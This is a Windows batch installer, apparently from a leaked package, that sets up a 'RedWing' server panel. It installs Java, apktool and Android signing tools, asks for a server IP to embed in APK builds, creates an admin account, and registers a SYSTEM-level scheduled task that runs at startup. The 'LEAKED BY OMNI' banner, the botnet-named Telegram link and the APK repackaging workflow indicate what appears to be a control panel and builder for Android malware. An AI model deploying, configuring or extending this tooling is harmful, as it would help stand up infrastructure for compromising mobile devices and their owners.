@echo off
chcp 65001 >nul 2>&1
setlocal enabledelayedexpansion

echo.
echo   ██████╗ ███████╗██████╗ ██╗    ██╗██╗███╗   ██╗ ██████╗
echo   ██╔══██╗██╔════╝██╔══██╗██║    ██║██║████╗  ██║██╔════╝
echo   ██████╔╝█████╗  ██║  ██║██║ █╗ ██║██║██╔██╗ ██║██║  ███╗
echo   ██╔══██╗██╔══╝  ██║  ██║██║███╗██║██║██║╚██╗██║██║   ██║
echo   ██║  ██║███████╗██████╔╝╚███╔███╔╝██║██║ ╚████║╚██████╔╝
echo   ╚═╝  ╚═╝╚══════╝╚═════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝
echo.
echo   LEAKED BY OMNI ^| t.me/omnibotnet ^| omni.lc
echo.

:: ── Проверка прав / Check privileges ───────────────────────────
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo   [!] Запустите от имени Администратора! / Run as Administrator!
    pause
    exit /b 1
)

set "INSTALL_DIR=C:\RedWing"
set "TOOLS_DIR=%INSTALL_DIR%\tools"
set "SCRIPT_DIR=%~dp0"

:: ── Проверка исходников / Verify source files ──────────────────
if not exist "%SCRIPT_DIR%bin\windows\server.exe" (
    echo   [!] Не найден bin\windows\server.exe! / bin\windows\server.exe not found!
    pause
    exit /b 1
)
if not exist "%SCRIPT_DIR%source\decom" (
    echo   [!] Не найдена source\decom! / source\decom not found!
    pause
    exit /b 1
)

:: ── Хелпер для скачивания / Download helper ────────────────────
:: PowerShell гарантированно есть, curl — нет на старых Windows
:: PowerShell is guaranteed, curl may be absent on older Windows

mkdir "%INSTALL_DIR%" 2>nul
mkdir "%TOOLS_DIR%" 2>nul

:: ── 1. Проверка Java / Check Java ──────────────────────────────
echo   [+] Проверка Java... / Checking Java...
java -version >nul 2>&1
if !errorLevel! neq 0 (
    echo.
    echo   [!] Java не найдена! / Java not found!

    :: Пробуем winget
    where winget >nul 2>&1
    if !errorLevel! equ 0 (
        echo   [*] Установка Java через winget... / Installing Java via winget...
        winget install --id EclipseAdoptium.Temurin.17.JRE -e --accept-source-agreements --accept-package-agreements 2>nul
        goto :java_check
    )

    :: Пробуем choco
    where choco >nul 2>&1
    if !errorLevel! equ 0 (
        echo   [*] Установка Java через chocolatey... / Installing Java via chocolatey...
        choco install temurin17jre -y 2>nul
        goto :java_check
    )

    :: Ни winget ни choco — ставим choco
    echo   [*] Пакетный менеджер не найден, установка Chocolatey... / No package manager found, installing Chocolatey...
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
        "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex ((New-Object Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))" >nul 2>&1
    set "PATH=%ALLUSERSPROFILE%\chocolatey\bin;!PATH!"

    where choco >nul 2>&1
    if !errorLevel! equ 0 (
        echo   [+] Chocolatey установлен. / Chocolatey installed.
        echo   [*] Установка Java через chocolatey... / Installing Java via chocolatey...
        choco install temurin17jre -y 2>nul
    ) else (
        echo   [*] Скачиваем Java напрямую... / Downloading Java directly...
        powershell -NoProfile -Command ^
            "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://api.adoptium.net/v3/binary/latest/17/ga/windows/x64/jre/hotspot/normal/eclipse', '%TEMP%\java-jre.zip')" 2>nul
        if exist "%TEMP%\java-jre.zip" (
            echo   [*] Распаковка Java... / Extracting Java...
            powershell -Command "Expand-Archive -Force '%TEMP%\java-jre.zip' '%INSTALL_DIR%\java'" >nul 2>&1
            for /d %%D in ("%INSTALL_DIR%\java\*") do set "JAVA_HOME=%%D"
            if defined JAVA_HOME (
                set "PATH=!JAVA_HOME!\bin;!PATH!"
                setx /M JAVA_HOME "!JAVA_HOME!" >nul 2>&1
                for /f "tokens=2*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path 2^>nul') do set "SYS_PATH=%%B"
                setx /M PATH "!JAVA_HOME!\bin;!SYS_PATH!" >nul 2>&1
            )
            del /q "%TEMP%\java-jre.zip" 2>nul
        )
    )

:java_check
    :: Обновляем PATH из реестра / Refresh PATH from registry
    for /f "tokens=2*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path 2^>nul') do set "PATH=%%B"
    for /f "tokens=2*" %%A in ('reg query "HKCU\Environment" /v Path 2^>nul') do set "PATH=!PATH!;%%B"
    set "PATH=%ALLUSERSPROFILE%\chocolatey\bin;!PATH!"

    java -version >nul 2>&1
    if !errorLevel! neq 0 (
        echo   [!] Java не установлена. Скачайте вручную: https://adoptium.net/
        echo   [!] Java not installed. Download manually: https://adoptium.net/
        pause
        exit /b 1
    )
)
echo   [+] Java OK.

:: ── 2. apktool 2.10.0 ─────────────────────────────────────────
echo   [+] Проверка apktool... / Checking apktool...
set "APKTOOL_OK=0"
apktool --version >nul 2>&1
if !errorLevel! equ 0 set "APKTOOL_OK=1"

if "!APKTOOL_OK!"=="0" (
    echo   [*] Установка apktool 2.10.0... / Installing apktool 2.10.0...

    powershell -NoProfile -Command ^
        "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.10.0.jar', '%TOOLS_DIR%\apktool.jar')" 2>nul

    :: Проверяем что скачался JAR, а не HTML
    powershell -NoProfile -Command ^
        "$f = '%TOOLS_DIR%\apktool.jar'; if ((Test-Path $f) -and (Get-Item $f).Length -gt 100000) { exit 0 } else { exit 1 }" 2>nul
    if !errorLevel! neq 0 (
        echo   [*] Bitbucket не отдал, качаем с GitHub... / Bitbucket failed, trying GitHub...
        powershell -NoProfile -Command ^
            "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://github.com/iBotPeaches/Apktool/releases/download/v2.10.0/apktool_2.10.0.jar', '%TOOLS_DIR%\apktool.jar')" 2>nul
    )

    (
        echo @echo off
        echo java -jar "%TOOLS_DIR%\apktool.jar" %%*
    ) > "%TOOLS_DIR%\apktool.bat"

    echo   [+] apktool установлен. / apktool installed.
)

:: ── 3. Android build-tools (apksigner + zipalign) ─────────────
echo   [+] Проверка Android build-tools... / Checking Android build-tools...
set "NEED_BT=0"

set "PATH=%TOOLS_DIR%;!PATH!"
apksigner --version >nul 2>&1
if !errorLevel! neq 0 set "NEED_BT=1"

if "!NEED_BT!"=="1" (
    echo   [*] Установка Android build-tools... / Installing Android build-tools...
    powershell -NoProfile -Command ^
        "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://dl.google.com/android/repository/build-tools_r35-windows.zip', '%TEMP%\bt.zip')" 2>nul

    if exist "%TEMP%\bt.zip" (
        powershell -NoProfile -Command "Expand-Archive -Force '%TEMP%\bt.zip' '%TEMP%\bt-extract'" >nul 2>&1

        :: Найти папку внутри архива / Find folder inside archive
        set "BT_FOUND="
        for /d %%D in ("%TEMP%\bt-extract\*") do (
            if exist "%%D\zipalign.exe" set "BT_FOUND=%%D"
        )

        if defined BT_FOUND (
            copy /y "!BT_FOUND!\zipalign.exe" "%TOOLS_DIR%\" >nul 2>&1
            if exist "!BT_FOUND!\apksigner.bat" copy /y "!BT_FOUND!\apksigner.bat" "%TOOLS_DIR%\" >nul 2>&1
            if exist "!BT_FOUND!\apksigner.jar" copy /y "!BT_FOUND!\apksigner.jar" "%TOOLS_DIR%\" >nul 2>&1
            if exist "!BT_FOUND!\lib" xcopy /E /I /Y /Q "!BT_FOUND!\lib" "%TOOLS_DIR%\lib" >nul 2>&1
            echo   [+] build-tools установлены. / build-tools installed.
        ) else (
            echo   [!] Не удалось найти build-tools в архиве. / Could not find build-tools in archive.
        )

        rd /s /q "%TEMP%\bt-extract" 2>nul
        del /q "%TEMP%\bt.zip" 2>nul
    ) else (
        echo   [!] Не удалось скачать build-tools. / Failed to download build-tools.
    )
)

:: Добавляем tools в системный PATH / Add tools to system PATH
for /f "tokens=2*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path 2^>nul') do set "SYS_PATH=%%B"
echo !SYS_PATH! | find /i "%TOOLS_DIR%" >nul 2>&1
if !errorLevel! neq 0 (
    setx /M PATH "!SYS_PATH!;%TOOLS_DIR%" >nul 2>&1
)
set "PATH=%TOOLS_DIR%;!PATH!"

:: Финальная проверка / Final check
apksigner --version >nul 2>&1
if !errorLevel! neq 0 (
    echo   [!] apksigner не работает. Установите Android SDK build-tools вручную.
    echo   [!] apksigner not working. Install Android SDK build-tools manually.
    pause
    exit /b 1
)
echo   [+] apksigner OK.

:: ── 4. Развёртывание файлов / Deploy files ─────────────────────
echo   [+] Развёртывание в %INSTALL_DIR%... / Deploying to %INSTALL_DIR%...
mkdir "%INSTALL_DIR%\data" 2>nul

copy /y "%SCRIPT_DIR%bin\windows\server.exe" "%INSTALL_DIR%\server.exe" >nul

:: Чистим старое перед копированием / Clean old before copying
if exist "%INSTALL_DIR%\decom" rd /s /q "%INSTALL_DIR%\decom" 2>nul
if exist "%INSTALL_DIR%\web"   rd /s /q "%INSTALL_DIR%\web" 2>nul
xcopy /E /I /Y /Q "%SCRIPT_DIR%source\decom" "%INSTALL_DIR%\decom" >nul
xcopy /E /I /Y /Q "%SCRIPT_DIR%source\web" "%INSTALL_DIR%\web" >nul

echo   [+] Файлы развёрнуты. / Files deployed.

:: ── 5. Настройка / Configuration ───────────────────────────────
echo.
echo   ── Настройка / Configuration ──
echo.

:: IP через PowerShell (curl может не быть) / IP via PowerShell
for /f "tokens=*" %%i in ('powershell -NoProfile -Command "try { (New-Object Net.WebClient).DownloadString('https://ifconfig.me').Trim() } catch { '' }" 2^>nul') do set "EXTERNAL_IP=%%i"

:: Локальный IP без привязки к языку / Local IP without locale dependency
if not defined EXTERNAL_IP (
    for /f "tokens=*" %%i in ('powershell -NoProfile -Command "(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.PrefixOrigin -ne 'WellKnown' -and $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress" 2^>nul') do set "EXTERNAL_IP=%%i"
)
set "DEFAULT_IP=%EXTERNAL_IP%"

set /p "SERVER_IP=  [?] IP для APK-билдов / IP for APK builds (Enter = %DEFAULT_IP%): "
if "!SERVER_IP!"=="" set "SERVER_IP=!DEFAULT_IP!"

set /p "PORT=  [?] Порт / Port (Enter = 8080): "
if "!PORT!"=="" set "PORT=8080"

set /p "REG_MODE=  [?] Регистрация / Registration — open / closed (Enter = closed): "
if "!REG_MODE!"=="" set "REG_MODE=closed"

:: ── 6. Инициализация / Initialization ──────────────────────────
echo.
echo   [+] Инициализация сервера... / Initializing server...

:: Убиваем старый процесс если есть / Kill old process if running
taskkill /f /im server.exe >nul 2>&1

set "INIT_INPUT=%TEMP%\redwing-init-input.txt"
set "INIT_LOG=%TEMP%\redwing-init-log.txt"

if "!REG_MODE!"=="closed" (
    set /p "ADMIN_LOGIN=  [?] Логин админа / Admin login (Enter = admin): "
    if "!ADMIN_LOGIN!"=="" set "ADMIN_LOGIN=admin"
    set /p "ADMIN_PASS=  [?] Пароль админа / Admin password (Enter = авто / auto): "

    (
        echo !ADMIN_LOGIN!
        echo !ADMIN_PASS!
    ) > "!INIT_INPUT!"
) else (
    type nul > "!INIT_INPUT!"
)

:: Запуск в фоне с редиректом stdin из файла / Background start with stdin from file
cd /d "%INSTALL_DIR%"
start "" /b /min cmd /c "set "SERVER_IP=!SERVER_IP!" & set "PORT=!PORT!" & set "REGISTRATION=!REG_MODE!" & "%INSTALL_DIR%\server.exe" < "!INIT_INPUT!" > "!INIT_LOG!" 2>&1"

echo   [*] Ожидание инициализации (8 сек)... / Waiting for initialization (8 sec)...
timeout /t 8 /nobreak >nul

:: Показываем вывод сервера / Show server output
if exist "!INIT_LOG!" (
    echo.
    for /f "usebackq delims=" %%L in ("!INIT_LOG!") do echo     %%L
    echo.
)

:: Убиваем процесс инициализации / Kill init process
taskkill /f /im server.exe >nul 2>&1
timeout /t 2 /nobreak >nul

del /q "!INIT_INPUT!" 2>nul
del /q "!INIT_LOG!" 2>nul

echo   [+] БД инициализирована. / DB initialized.

:: ── 7. start.bat + автозапуск / start.bat + autostart ─────────
echo   [+] Создание автозапуска... / Creating autostart...

(
    echo @echo off
    echo set "SERVER_IP=!SERVER_IP!"
    echo set "PORT=!PORT!"
    echo set "REGISTRATION=!REG_MODE!"
    echo set "PATH=%TOOLS_DIR%;%%PATH%%"
    echo cd /d "%INSTALL_DIR%"
    echo "%INSTALL_DIR%\server.exe"
) > "%INSTALL_DIR%\start.bat"

schtasks /delete /tn "RedWing" /f >nul 2>&1
schtasks /create /tn "RedWing" /tr "\"%INSTALL_DIR%\start.bat\"" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1

:: ── 8. Запуск / Start ──────────────────────────────────────────
echo   [+] Запуск сервера... / Starting server...
cd /d "%INSTALL_DIR%"
start "" /min cmd /c ""%INSTALL_DIR%\start.bat""
timeout /t 3 /nobreak >nul

:: ── 9. Итог / Summary ──────────────────────────────────────────
echo.
echo   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo   RedWing запущен! / RedWing is running!
echo.
echo   Панель / Panel:        http://!SERVER_IP!:!PORT!
echo   Директория / Dir:      %INSTALL_DIR%
echo   Перезапуск / Restart:  taskkill /f /im server.exe ^& "%INSTALL_DIR%\start.bat"
echo   Автозапуск / Autostart: Task Scheduler - "RedWing"
echo   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo.
pause
